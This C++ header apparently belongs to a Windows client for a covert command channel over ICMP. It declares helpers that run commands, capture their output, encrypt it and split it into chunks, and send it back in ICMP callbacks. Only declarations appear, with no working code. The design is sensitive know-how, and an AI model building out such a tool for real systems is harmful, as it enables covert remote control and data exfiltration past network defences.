#pragma once

#include "icmp.h"
#include <sodium.h>
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <string>
#include <vector>
#include <codecvt>
#include <locale>
// Forward declarations
class Client;
class AESHandler;

// Declare global variables (use smart pointers or encapsulate if possible in the future)
extern AESHandler* aesHandler;
extern Client* client;

// Helper namespace for better organization
namespace Helper {

    /**
     * @brief Runs a command with arguments and captures the output.
     * @param command The command to execute.
     * @param arguments The arguments for the command.
     * @param output The string to store the output.
     * @return True if the command executed successfully, false otherwise.
     */
    bool Run(const std::wstring& command, const std::wstring& arguments, std::string& output);

    /**
     * @brief Converts a hexadecimal string to a vector of bytes.
     * @param hex The hexadecimal string.
     * @return A vector of bytes.
     */
    std::vector<unsigned char> hex_to_bytes(const std::string& hex);

    /**
     * @brief Converts a vector of bytes to a hexadecimal string.
     * @param bytes The vector of bytes.
     * @return A hexadecimal string.
     */
    std::string bytes_to_hex(const std::vector<unsigned char>& bytes);

    std::vector<std::string> EncryptAndSplit(const std::string& client_response);

    /**
     * @brief Handles callback logic for a given socket and ICMP packet.
     * @param sockfd The socket file descriptor.
     * @param icmp The custom ICMP object.
     * @param ip_addr The IP address.
     * @param connected The connection status.
     * @param client_out The client output.
     * @return The resulting string after handling the callback.
     */
    void Callback(SOCKET sockfd, Custom_icmp icmp, const std::string& ip_addr, bool connected, bool exec, bool exit = false);

    /**
     * @brief Executes a command and processes the callback with ICMP.
     * @param sockfd The socket file descriptor.
     * @param icmp The custom ICMP object.
     * @param ip_addr The IP address.
     * @param connected The connection status.
     * @param command The command to execute.
     * @param arguments The command arguments.
     * @return An integer indicating the result of the execution and callback.
     */
    int ExecAndCallback(SOCKET sockfd, Custom_icmp icmp, const std::string& ip_addr, bool connected, const std::wstring& command, const std::wstring& arguments);

    /**
     * @brief Converts a standard string to a wide string.
     * @param stringToConvert The string to convert.
     * @return The resulting wide string.
     */
    std::wstring to_wstring(const std::string& stringToConvert);

    /**
     * @brief Splits a string into a vector of substrings based on whitespace.
     * @param str The string to split.
     * @return A vector of substrings.
     */
    std::vector<std::string> splitString(const std::string& str);

    /**
     * @brief Splits a string into chunks of a specified size.
     * @param str The string to split.
     * @param n The size of each chunk.
     * @return A vector of string chunks.
     */
    std::vector<std::string> split(const std::string& str, int n);

} // namespace Helper
